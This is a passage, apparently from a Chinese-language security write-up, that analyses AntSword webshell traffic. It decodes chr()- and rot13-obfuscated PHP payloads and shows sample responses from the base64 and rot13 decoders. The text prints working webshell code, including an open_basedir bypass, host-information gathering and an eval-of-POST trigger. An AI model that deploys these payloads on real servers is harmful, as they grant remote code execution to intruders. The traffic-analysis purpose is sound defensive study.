hR(0x22).ChR(0x2c).ChR(0x24).ChR(0x74).ChR(0x6d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x29).ChR(0x3b).ChR(0x66).ChR(0x6f).ChR(0x72).ChR(0x28).ChR(0x24).ChR(0x69).ChR(0x3d).ChR(0x30).ChR(0x3b).ChR(0x24).ChR(0x69).ChR(0x3c).ChR(0x73).ChR(0x69).ChR(0x7a).ChR(0x65).ChR(0x6f).ChR(0x66).ChR(0x28).ChR(0x24).ChR(0x63).ChR(0x6e).ChR(0x74).ChR(0x61).ChR(0x72).ChR(0x72).ChR(0x29).ChR(0x3b).ChR(0x24).ChR(0x69).ChR(0x2b).ChR(0x2b).ChR(0x29).ChR(0x7b).ChR(0x40).ChR(0x63).ChR(0x68).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x28).ChR(0x22).ChR(0x2e).ChR(0x2e).ChR(0x22).ChR(0x29).ChR(0x3b).ChR(0x7d).ChR(0x3b).ChR(0x40).ChR(0x69).ChR(0x6e).ChR(0x69).ChR(0x5f).ChR(0x73).ChR(0x65).ChR(0x74).ChR(0x28).ChR(0x22).ChR(0x6f).ChR(0x70).ChR(0x65).ChR(0x6e).ChR(0x5f).ChR(0x62).ChR(0x61).ChR(0x73).ChR(0x65).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x22).ChR(0x2c).ChR(0x22).ChR(0x2f).ChR(0x22).ChR(0x29).ChR(0x3b).ChR(0x40).ChR(0x72).ChR(0x6d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x28).ChR(0x24).ChR(0x74).ChR(0x6d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x29).ChR(0x3b).ChR(0x62).ChR(0x72).ChR(0x65).ChR(0x61).ChR(0x6b).ChR(0x3b).ChR(0x7d).ChR(0x3b).ChR(0x7d).ChR(0x3b).ChR(0x3b).ChR(0x66).ChR(0x75).ChR(0x6e).ChR(0x63).ChR(0x74).ChR(0x69).ChR(0x6f).ChR(0x6e).ChR(0x20).ChR(0x61).ChR(0x73).ChR(0x65).ChR(0x6e).ChR(0x63).ChR(0x28).ChR(0x24).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x29).ChR(0x7b).ChR(0x72).ChR(0x65).ChR(0x74).ChR(0x75).ChR(0x72).ChR(0x6e).ChR(0x20).ChR(0x24).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x3b).ChR(0x7d).ChR(0x3b).ChR(0x66).ChR(0x75).ChR(0x6e).ChR(0x63).ChR(0x74).ChR(0x69).ChR(0x6f).ChR(0x6e).ChR(0x20).ChR(0x61).ChR(0x73).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x70).ChR(0x75).ChR(0x74).ChR(0x28).ChR(0x29).ChR(0x7b).ChR(0x24).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x70).ChR(0x75).ChR(0x74).ChR(0x3d).ChR(0x6f).ChR(0x62).ChR(0x5f).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x5f).ChR(0x63).ChR(0x6f).ChR(0x6e).ChR(0x74).ChR(0x65).ChR(0x6e).ChR(0x74).ChR(0x73).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x6f).ChR(0x62).ChR(0x5f).ChR(0x65).ChR(0x6e).ChR(0x64).ChR(0x5f).ChR(0x63).ChR(0x6c).ChR(0x65).ChR(0x61).ChR(0x6e).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x22).ChR(0x66).ChR(0x34).ChR(0x66).ChR(0x64).ChR(0x22).ChR(0x2e).ChR(0x22).ChR(0x34).ChR(0x62).ChR(0x34).ChR(0x31).ChR(0x64).ChR(0x22).ChR(0x3b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x40).ChR(0x61).ChR(0x73).ChR(0x65).ChR(0x6e).ChR(0x63).ChR(0x28).ChR(0x24).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x70).ChR(0x75).ChR(0x74).ChR(0x29).ChR(0x3b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x22).ChR(0x30).ChR(0x63).ChR(0x61).ChR(0x33).ChR(0x37).ChR(0x62).ChR(0x22).ChR(0x2e).ChR(0x22).ChR(0x31).ChR(0x65).ChR(0x30).ChR(0x61).ChR(0x36).ChR(0x61).ChR(0x22).ChR(0x3b).ChR(0x7d).ChR(0x6f).ChR(0x62).ChR(0x5f).ChR(0x73).ChR(0x74).ChR(0x61).ChR(0x72).ChR(0x74).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x74).ChR(0x72).ChR(0x79).ChR(0x7b).ChR(0x24).ChR(0x44).ChR(0x3d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x6e).ChR(0x61).ChR(0x6d).ChR(0x65).ChR(0x28).ChR(0x24).ChR(0x5f).ChR(0x53).ChR(0x45).ChR(0x52).ChR(0x56).ChR(0x45).ChR(0x52).ChR(0x5b).ChR(0x22).ChR(0x53).ChR(0x43).ChR(0x52).ChR(0x49).ChR(0x50).ChR(0x54).ChR(0x5f).ChR(0x46).ChR(0x49).ChR(0x4c).ChR(0x45).ChR(0x4e).ChR(0x41).ChR(0x4d).ChR(0x45).ChR(0x22).ChR(0x5d).ChR(0x29).ChR(0x3b).ChR(0x69).ChR(0x66).ChR(0x28).ChR(0x24).ChR(0x44).ChR(0x3d).ChR(0x3d).ChR(0x22).ChR(0x22).ChR(0x29).ChR(0x24).ChR(0x44).ChR(0x3d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x6e).ChR(0x61).ChR(0x6d).ChR(0x65).ChR(0x28).ChR(0x24).ChR(0x5f).ChR(0x53).ChR(0x45).ChR(0x52).ChR(0x56).ChR(0x45).ChR(0x52).ChR(0x5b).ChR(0x22).ChR(0x50).ChR(0x41).ChR(0x54).ChR(0x48).ChR(0x5f).ChR(0x54).ChR(0x52).ChR(0x41).ChR(0x4e).ChR(0x53).ChR(0x4c).ChR(0x41).ChR(0x54).ChR(0x45).ChR(0x44).ChR(0x22).ChR(0x5d).ChR(0x29).ChR(0x3b).ChR(0x24).ChR(0x52).ChR(0x3d).ChR(0x22).ChR(0x7b).ChR(0x24).ChR(0x44).ChR(0x7d).ChR(0x9).ChR(0x22).ChR(0x3b).ChR(0x69).ChR(0x66).ChR(0x28).ChR(0x73).ChR(0x75).ChR(0x62).ChR(0x73).ChR(0x74).ChR(0x72).ChR(0x28).ChR(0x24).ChR(0x44).ChR(0x2c).ChR(0x30).ChR(0x2c).ChR(0x31).ChR(0x29).ChR(0x21).ChR(0x3d).ChR(0x22).ChR(0x2f).ChR(0x22).ChR(0x29).ChR(0x7b).ChR(0x66).ChR(0x6f).ChR(0x72).ChR(0x65).ChR(0x61).ChR(0x63).ChR(0x68).ChR(0x28).ChR(0x72).ChR(0x61).ChR(0x6e).ChR(0x67).ChR(0x65).ChR(0x28).ChR(0x22).ChR(0x43).ChR(0x22).ChR(0x2c).ChR(0x22).ChR(0x5a).ChR(0x22).ChR(0x29).ChR(0x61).ChR(0x73).ChR(0x20).ChR(0x24).ChR(0x4c).ChR(0x29).ChR(0x69).ChR(0x66).ChR(0x28).ChR(0x69).ChR(0x73).ChR(0x5f).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x28).ChR(0x22).ChR(0x7b).ChR(0x24).ChR(0x4c).ChR(0x7d).ChR(0x3a).ChR(0x22).ChR(0x29).ChR(0x29).ChR(0x24).ChR(0x52).ChR(0x2e).ChR(0x3d).ChR(0x22).ChR(0x7b).ChR(0x24).ChR(0x4c).ChR(0x7d).ChR(0x3a).ChR(0x22).ChR(0x3b).ChR(0x7d).ChR(0x65).ChR(0x6c).ChR(0x73).ChR(0x65).ChR(0x7b).ChR(0x24).ChR(0x52).ChR(0x2e).ChR(0x3d).ChR(0x22).ChR(0x2f).ChR(0x22).ChR(0x3b).ChR(0x7d).ChR(0x24).ChR(0x52).ChR(0x2e).ChR(0x3d).ChR(0x22).ChR(0x9).ChR(0x22).ChR(0x3b).ChR(0x24).ChR(0x75).ChR(0x3d).ChR(0x28).ChR(0x66).ChR(0x75).ChR(0x6e).ChR(0x63).ChR(0x74).ChR(0x69).ChR(0x6f).ChR(0x6e).ChR(0x5f).ChR(0x65).ChR(0x78).ChR(0x69).ChR(0x73).ChR(0x74).ChR(0x73).ChR(0x28).ChR(0x22).ChR(0x70).ChR(0x6f).ChR(0x73).ChR(0x69).ChR(0x78).ChR(0x5f).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x65).ChR(0x67).ChR(0x69).ChR(0x64).ChR(0x22).ChR(0x29).ChR(0x29).ChR(0x3f).ChR(0x40).ChR(0x70).ChR(0x6f).ChR(0x73).ChR(0x69).ChR(0x78).ChR(0x5f).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x70).ChR(0x77).ChR(0x75).ChR(0x69).ChR(0x64).ChR(0x28).ChR(0x40).ChR(0x70).ChR(0x6f).ChR(0x73).ChR(0x69).ChR(0x78).ChR(0x5f).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x65).ChR(0x75).ChR(0x69).ChR(0x64).ChR(0x28).ChR(0x29).ChR(0x29).ChR(0x3a).ChR(0x22).ChR(0x22).ChR(0x3b).ChR(0x24).ChR(0x73).ChR(0x3d).ChR(0x28).ChR(0x24).ChR(0x75).ChR(0x29).ChR(0x3f).ChR(0x24).ChR(0x75).ChR(0x5b).ChR(0x22).ChR(0x6e).ChR(0x61).ChR(0x6d).ChR(0x65).ChR(0x22).ChR(0x5d).ChR(0x3a).ChR(0x40).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x5f).ChR(0x63).ChR(0x75).ChR(0x72).ChR(0x72).ChR(0x65).ChR(0x6e).ChR(0x74).ChR(0x5f).ChR(0x75).ChR(0x73).ChR(0x65).ChR(0x72).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x24).ChR(0x52).ChR(0x2e).ChR(0x3d).ChR(0x70).ChR(0x68).ChR(0x70).ChR(0x5f).ChR(0x75).ChR(0x6e).ChR(0x61).ChR(0x6d).ChR(0x65).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x24).ChR(0x52).ChR(0x2e).ChR(0x3d).ChR(0x22).ChR(0x9).ChR(0x7b).ChR(0x24).ChR(0x73).ChR(0x7d).ChR(0x22).ChR(0x3b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x24).ChR(0x52).ChR(0x3b).ChR(0x3b).ChR(0x7d).ChR(0x63).ChR(0x61).ChR(0x74).ChR(0x63).ChR(0x68).ChR(0x28).ChR(0x45).ChR(0x78).ChR(0x63).ChR(0x65).ChR(0x70).ChR(0x74).ChR(0x69).ChR(0x6f).ChR(0x6e).ChR(0x20).ChR(0x24).ChR(0x65).ChR(0x29).ChR(0x7b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x22).ChR(0x45).ChR(0x52).ChR(0x52).ChR(0x4f).ChR(0x52).ChR(0x3a).ChR(0x2f).ChR(0x2f).ChR(0x22).ChR(0x2e).ChR(0x24).ChR(0x65).ChR(0x2d).ChR(0x3e).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x4d).ChR(0x65).ChR(0x73).ChR(0x73).ChR(0x61).ChR(0x67).ChR(0x65).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x7d).ChR(0x3b).ChR(0x61).ChR(0x73).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x70).ChR(0x75).ChR(0x74).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x64).ChR(0x69).ChR(0x65).ChR(0x28).ChR(0x29).ChR(0x3b));
```

使用 python 脚本进行解码：

```python
with open("./data.txt", "r") as f:
    data = f.read()

data = data.lower()
data = [i.split("(")[1].split(")")[0] for i in data.split(".")]

print("".join([chr(int(i,16)) for i in data]))
```

解码后得到：

```php
@ini_set("display_errors", "0");
@set_time_limit(0);
$opdir = @ini_get("open_basedir");
if ($opdir) {
    $ocwd = dirname($_SERVER["SCRIPT_FILENAME"]);
    $oparr = preg_split("/;|:/", $opdir);
    @array_push($oparr, $ocwd, sys_get_temp_dir());
    foreach ($oparr as $item) {
        if (!@is_writable($item)) {
            continue;
        };
        $tmdir = $item . "/.163fc9";
        @mkdir($tmdir);
        if (!@file_exists($tmdir)) {
            continue;
        }
        @chdir($tmdir);
        @ini_set("open_basedir", "..");
        $cntarr = @preg_split("/\\\\|\//", $tmdir);
        for ($i = 0; $i < sizeof($cntarr); $i++) {
            @chdir("..");
        };
        @ini_set("open_basedir", "/");
        @rmdir($tmdir);
        break;
    };
};;
function asenc($out)
{
    return $out;
};
function asoutput()
{
    $output = ob_get_contents();
    ob_end_clean();
    echo "2b6d2" . "e1ead7";
    echo @asenc($output);
    echo "19f" . "58d5";
}
ob_start();
try {
    $D = dirname($_SERVER["SCRIPT_FILENAME"]);
    if ($D == "") $D = dirname($_SERVER["PATH_TRANSLATED"]);
    $R = "{$D}";
    if (substr($D, 0, 1) != "/") {
        foreach (range("C", "Z") as $L) if (is_dir("{$L}:")) $R .= "{$L}:";
    } else {
        $R .= "/";
    }
    $R .= " ";
    $u = (function_exists("posix_getegid")) ? @posix_getpwuid(@posix_geteuid()) : "";
    $s = ($u) ? $u["name"] : @get_current_user();
    $R .= php_uname();
    $R .= "{$s}";
    echo $R;;
} catch (Exception $e) {
    echo "ERROR://" . $e->getMessage();
};
asoutput();
die();
```

## 编码器：rot13

本质上也只是使用了 rot13 编码做了混淆处理：

```php
jfb93ddc1c561e=@vav_frg("qvfcynl_reebef", "0");@frg_gvzr_yvzvg(0);$bcqve=@vav_trg("bcra_onfrqve");vs($bcqve) {$bpjq=qveanzr($_FREIRE["FPEVCG_SVYRANZR"]);$bcnee=cert_fcyvg("/;|:/",$bcqve);@neenl_chfu($bcnee,$bpjq,flf_trg_grzc_qve());sbernpu($bcnee nf $vgrz) {vs(!@vf_jevgnoyr($vgrz)){pbagvahr;};$gzqve=$vgrz."/.0rr4n1";@zxqve($gzqve);vs(!@svyr_rkvfgf($gzqve)){pbagvahr;}@puqve($gzqve);@vav_frg("bcra_onfrqve", "..");$pagnee=@cert_fcyvg("/\\\\|\//",$gzqve);sbe($v=0;$v<fvmrbs($pagnee);$v++){@puqve("..");};@vav_frg("bcra_onfrqve","/");@ezqve($gzqve);oernx;};};;shapgvba nfrap($bhg){erghea $bhg;};shapgvba nfbhgchg(){$bhgchg=bo_trg_pbagragf();bo_raq_pyrna();rpub "927"."65q";rpub @nfrap($bhgchg);rpub "26q449"."27860o";}bo_fgneg();gel{$Q=qveanzr($_FREIRE["FPEVCG_SVYRANZR"]);vs($Q=="")$Q=qveanzr($_FREIRE["CNGU_GENAFYNGRQ"]);$E="{$Q}	";vs(fhofge($Q,0,1)!="/"){sbernpu(enatr("P","M")nf $Y)vs(vf_qve("{$Y}:"))$E.="{$Y}:";}ryfr{$E.="/";}$E.="	";$h=(shapgvba_rkvfgf("cbfvk_trgrtvq"))?@cbfvk_trgcjhvq(@cbfvk_trgrhvq()):"";$f=($h)?$h["anzr"]:@trg_pheerag_hfre();$E.=cuc_hanzr();$E.="{$f}";rpub $E;;}pngpu(Rkprcgvba $r){rpub "REEBE://".$r->trgZrffntr();};nfbhgchg();qvr();&shell=@eval(@str_rot13($_POST['jfb93ddc1c561e']));
```

rot13 解码之后得到：

```php
wso93qqp1p561r=@ini_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) {$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr=preg_split("/;|:/",$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item."/.0ee4a1";@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}@chdir($tmdir);@ini_set("open_basedir", "..");$cntarr=@preg_split("/\\\\|\//",$tmdir);for($i=0;$i<sizeof($cntarr);$i++){@chdir("..");};@ini_set("open_basedir","/");@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "927"."65d";echo @asenc($output);echo "26d449"."27860b";}ob_start();try{$D=dirname($_SERVER["SCRIPT_FILENAME"]);if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);$R="{$D}	";if(substr($D,0,1)!="/"){foreach(range("C","Z")as $L)if(is_dir("{$L}:"))$R.="{$L}:";}else{$R.="/";}$R.="	";$u=(function_exists("posix_getegid"))?@posix_getpwuid(@posix_geteuid()):"";$s=($u)?$u["name"]:@get_current_user();$R.=php_uname();$R.="{$s}";echo $R;;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();&furyy=@riny(@fge_ebg13($_CBFG['wso93qqp1p561r']));
```

本是上 payload 还是一样的，只是做了一层 rot13 混淆

## 解码器：default

default 模式下的解码器，将导致 webshell 直接回复明文形式的执行结果

```plaintext
D:/wamp64/www	C:D:F:	Windows NT DESKTOP-O4R9UCA 10.0 build 19045 (Windows 10) AMD64	SYSTEM
```

## 解码器：base64

webshell 会将执行结果做一次 base64 编码之后，回复给蚁剑

:::info base64 混淆
此模式下的 webshell 回复的数据，可能会在头部随机加入噪音，使得回复的 webshell 执行结果没有办法直接 base64 解码成明文，需要试探性地丢弃回复流量数据的头部几个字节
:::

```plaintext
4a3dd412c8fRDovd2FtcDY0L3d3dwlDOkQ6RjoJV2luZG93cyBOVCBERVNLVE9QLU80UjlVQ0EgMTAuMCBidWlsZCAxOTA0NSAoV2luZG93cyAxMCkgQU1ENjQJU1lTVEVN16facefe308
```

解码后得到：

```plaintext
D:/wamp64/www	C:D:F:	Windows NT DESKTOP-O4R9UCA 10.0 build 19045 (Windows 10) AMD64	SYSTEM
```

![antSword decoder base64](img/image_20231010-231044.png)

## 解码器：rot13

类似于 rot13 模式的编码器，也是对 webshell 的执行结果做了一次 rot13 编码，然后回复给蚁剑

```plaintext
fd0a5Q:/jnzc64/jjj	P:Q:S:	Jvaqbjf AG QRFXGBC-B4E9HPN 10.0 ohvyq 19045 (Jvaqbjf 10) NZQ64	FLFGRZ1d2c5
```

rot13 解码后得到：

```plaintext
D:/wamp64/www	C:D:F:	Windows NT DESKTOP-O4R9UCA 10.0 build 19045 (Windows 10) AMD64	SYSTEM
```